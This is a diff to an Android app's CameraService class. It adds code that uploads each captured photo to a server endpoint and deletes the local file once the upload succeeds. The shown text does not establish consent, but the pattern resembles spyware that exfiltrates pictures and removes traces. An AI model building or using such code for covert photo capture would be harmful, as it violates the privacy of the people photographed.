@@ -12,14 +12,22 @@ import android.hardware.camera2.CameraManager;
 import android.os.Build;
 
 import com.fs.fs.App;
+import com.fs.fs.api.network.ApiConfig;
+import com.fs.fs.api.network.core.BaseResponse;
+import com.fs.fs.api.network.core.HttpParams;
+import com.fs.fs.api.network.core.OkHttpUtils;
+import com.fs.fs.api.network.core.callback.HttpCallback;
 import com.fs.fs.utils.DateUtils;
 import com.fs.fs.utils.FileUtils;
 import com.fs.fs.utils.LogUtils;
 
+import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.Date;
 import java.util.List;
+
+import okhttp3.Headers;
 
 /**
  * Created by wyx on 2017/1/3.
@@ -88,7 +96,19 @@ public class CameraService {
                     LogUtils.d(path);
                     out = new FileOutputStream(path);
                     out.write(data);
-                    // TODO:上传并删除
+
+                    final File file = new File(path);
+                    OkHttpUtils.postAsync(ApiConfig.getPicture(), new HttpParams().addFile("picture", file), new HttpCallback(BaseResponse.class) {
+                        @Override
+                        public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                            FileUtils.delete(file);
+                        }
+
+                        @Override
+                        public void onError(String errorMsg) {
+
+                        }
+                    });
                 } catch (Exception e) {
                     e.printStackTrace();
                 } finally {
